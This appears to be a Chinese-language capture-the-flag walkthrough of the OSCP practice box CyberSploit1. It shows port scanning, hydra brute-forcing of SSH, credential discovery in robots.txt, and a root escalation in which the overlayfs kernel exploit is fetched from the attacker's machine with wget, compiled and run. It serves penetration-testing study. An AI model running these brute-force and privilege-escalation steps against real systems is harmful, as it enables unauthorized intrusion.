# OSCP系列靶场-Esay-CyberSploit1

## 总结

getwebshell → 源码注释发现用户名 → `robots.txt`发现`base64`密码 → SSH登录

提 权 思 路 → 内网信息收集 → 发现发行版本有点老 → 内核`overlayfs`提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.220`

![](https://image.3001.net/images/20230724/1690167367_64bde847726151ed9c2f7.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.176.92`

![](https://image.3001.net/images/20230724/1690167368_64bde8486b3b0049e77b5.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    ┌──(root㉿Kali)-[/home/bachang/CyberSploit1]
    └─# ┌──(root㉿Kali)-[/home/bachang/Blogger]
    └─# sudo nmap --min-rate 10000 -p- 192.168.176.92
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 11:45 CST
    Nmap scan report for 192.168.176.92
    Host is up (0.30s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds
    

![](https://image.3001.net/images/20230724/1690167369_64bde8493413aa3ce65c2.png!small)  
通过两次收集到的端口:`→22,80`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80 192.168.176.92
    

![](https://image.3001.net/images/20230724/1690167370_64bde84a8ab2b2f3987f1.png!small)

## 信息收集-端口测试

两个端口的话，通常突破口在`80端口`

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用(待定)

通过`Nmap`探测获得SSH的版本信息，可以尝试利用

    
    
    # 进入msf # 探测版本为OpenSSH 5.9p1 Debian 5ubuntu1.10 
    msfconsole
    # 搜索对应脚本
    msf6 > searchsploit OpenSSH 5.9p1
    

貌似存在用户枚举，等没思路的时候可以来试试

![](https://image.3001.net/images/20230724/1690167371_64bde84bef05990ab641d.png!small)

#### 22-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破

    
    
    ssh root@192.168.176.92 -p 22
    # 密码尝试
    password > root
    

![](https://image.3001.net/images/20230724/1690167373_64bde84d553dba3b4e1e4.png!small)

#### 22-SSH弱口令爆破(挂着干别的)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.176.92 ssh -s 22
    

![](https://image.3001.net/images/20230724/1690167374_64bde84e6f630b143bcc5.png!small)

### 80-HTTP端口的信息收集

访问 http://192.168.176.92/ 发现不是一个标准的`CMS`从源码查看开始

![](https://image.3001.net/images/20230724/1690167375_64bde84ff187c4f7a8387.png!small)

#### 信息收集-源码查看

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.176.92:80
    

收集到一个用户名信息 `itsskv`

![](https://image.3001.net/images/20230724/1690167377_64bde85110856f595505f.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.176.92:80 -x 302,403
    

因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

![](https://image.3001.net/images/20230724/1690167378_64bde852437fc57ed4630.png!small)

#### 信息收集-目录访问

`/robots.txt`端点访问  
存在一串代码，推测是加密，带等号尝试用`bashe64`解密

    
    
    Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
    

![](https://image.3001.net/images/20230724/1690167379_64bde8533ba24f4b83b96.png!small)

##### base64解密

利用`kali`解密得到了内容，确认是`base64`加密

    
    
    ┌──(root㉿Kali)-[/home/bachang/Blogger]
    └─# echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
    " | base64 -d
    cybersploit{youtube.com/c/cybersploit}
    

`另外两个端点`没东西

## 漏洞利用-getwebshell

#### 信息泄露getwebshell

已知用户名 `itsskv`和 `cybersploit{youtube.com/c/cybersploit}`  
头脑风暴一下，密码会不会和`cybersploit{youtube.com/c/cybersploit}`有关  
之前`hyrda`可以爆破说明`22端口`是允许账号密码登录的

#### 22-SSH账号密码登录(成功)

获取账号密码之后利用SSH进行登录

    
    
    ssh itsskv<span>@192.168.176.92</span> -p22
    password > cybersploit (失败)
    password > cybersploit{youtube.com/c/cybersploit}(成功)
    

密码真长，我真的会谢

![](https://image.3001.net/images/20230724/1690167380_64bde85400c214b53534f.png!small)

## 内网遨游-getshell

### FLAG1获取

    
    
    # 有2个，理论上排除掉第一个，找home下
    itsskv<span>@cybersploit-CTF</span>:~$ find / -name local.txt 2>/dev/null
    /usr/share/checkbox/jobs/local.txt
    /home/itsskv/local.txt
    itsskv<span>@cybersploit-CTF</span>:~$ cat /home/itsskv/local.txt
    *********************
    

![](https://image.3001.net/images/20230724/1690167380_64bde854e6313dfe3ab93.png!small)

### 信息收集-内网基础信息收集

在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测操作系统的发行版本

    
    
    # 确定发行版本   较老
    itsskv<span>@cybersploit-CTF</span>:~$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 12.04.5 LTS
    Release:        12.04
    Codename:       precise
    

#### 查看内核版本信息

    
    
    # 确定内核版本
    itsskv<span>@cybersploit-CTF</span>:~$ uname -a 
    Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
    

#### 确认home目录下用户

    
    
    itsskv<span>@cybersploit-CTF</span>:~$ ls -al /home
    total 16
    # 有两个用户
    drwxr-xr-x 22 cybersploit cybersploit 4096 Sep  4  2020 cybersploit
    drwxr-xr-x 20 itsskv      itsskv      4096 Sep  4  2020 itsskv
    

##### 确认home目录下是否有隐藏文件

    
    
    # 例如.ssh找密码  ./*_history找历史记录等
    itsskv<span>@cybersploit-CTF</span>:~$ ls -al /home/itsskv
    # 查看了一下没啥
    drwxr-xr-x 20 itsskv itsskv  4096 Sep  4  2020 .
    drwxr-xr-x  4 root   root    4096 Jun 25  2020 ..
    -rw-------  1 itsskv itsskv     0 Sep  4  2020 .bash_history
    -rw-r--r--  1 itsskv itsskv   220 Jun 25  2020 .bash_logout
    -rw-r--r--  1 itsskv itsskv  3486 Jun 25  2020 .bashrc
    drwx------ 14 itsskv itsskv  4096 Jun 25  2020 .cache
    drwx------  9 itsskv itsskv  4096 Jun 25  2020 .config
    

### 权限提升

#### Linux提权-内核overlayfs提权尝试

因为发行版本较老，若存在以下情况进行`overlayfsLinux Kernel Version`提权

系统| 版本  
---|---  
Linux Kernel Version| 大于3.13.0小于3.19  
Ubuntu| Linux 15.04  
Ubuntu| Linux 14.10  
Ubuntu| Linux 14.10  
Ubuntu| Linux 12.04  
  
#### 漏洞利用-内核overlayfs提权

    
    
    msfconsole
    msf > searchsploit overlayfs
    

![](https://image.3001.net/images/20230724/1690167381_64bde855c1052266d44bd.png!small)  
结合 `3.13.0-32`的版本信息选择2与3

![](https://image.3001.net/images/20230724/1690167382_64bde856baaa444bdcd83.png!small)

    
    
    # 如果想查看msf对应的内容
    cat /usr/share/exploitdb/exploits/linux/local/37292.c
    

![](https://image.3001.net/images/20230724/1690167383_64bde857c4aedd830b007.png!small)

将文件保存在当前目录下，方便开启`http`服务

    
    
    ┌──(root㉿Kali)-[/home/bachang/CyberSploit1]
    └─# cp /usr/share/exploitdb/exploits/linux/local/37292.c ./shell.c
    
    ┌──(root㉿Kali)-[/home/bachang/CyberSploit1]
    └─# ls
    hydra.restore  shell.c
    

![](https://image.3001.net/images/20230724/1690167384_64bde858be860689a312c.png!small)  
攻击机开启服务

    
    
    sudo python3 -m http.server 80
    

目标机器

    
    
    # 首先到具有权限的目录下  如/tmp
    itsskv<span>@cybersploit-CTF</span>:~$ cd /tmp
    # 下载
    itsskv<span>@cybersploit-CTF</span>:/tmp$ wget http://192.168.45.220/shell.c
    

![](https://image.3001.net/images/20230724/1690167385_64bde859a94266174ee92.png!small)

    
    
    # 给权限
    itsskv<span>@cybersploit-CTF</span>:/tmp$ chmod +x shell.c
    # 如果是c的需要进行编译
    itsskv<span>@cybersploit-CTF</span>:/tmp$ gcc shell.c -o shell.c
    # 运行
    itsskv<span>@cybersploit-CTF</span>:/tmp$ ./shell.c
    spawning threads
    mount #1
    mount #2
    child threads done
    /etc/ld.so.preload created
    creating shared library
    # whoami
    root
    

提权成功

![](https://image.3001.net/images/20230724/1690167387_64bde85b11faeab844169.png!small)

### FLAG2获取

    
    
    # cat /root/proof.txt
    *********************
    

完结撒花~~~

![](https://image.3001.net/images/20230724/1690167388_64bde85c10f22b198c888.png!small)

